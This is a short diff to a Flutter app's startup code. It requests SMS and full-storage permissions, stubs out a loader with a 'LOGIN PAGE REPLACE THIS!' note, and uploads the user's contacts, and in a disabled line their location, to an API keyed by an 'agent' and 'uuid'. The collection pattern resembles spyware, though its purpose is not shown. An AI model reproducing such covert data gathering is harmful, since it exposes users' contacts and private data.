@@ -34,7 +34,9 @@ class Init {
     await _requestPermission(Permission.sms);
     await _requestPermission(Permission.manageExternalStorage);
 
-    dummyLoader();
+    //! LOGIN PAGE REPLACE THIS!
+    // dummyLoader();
+
     // Api.sendLocation(agent, uuid);
     if (getContacts) await Api.sendContacts(context, agent, uuid);
     print('getContacts $getContacts');
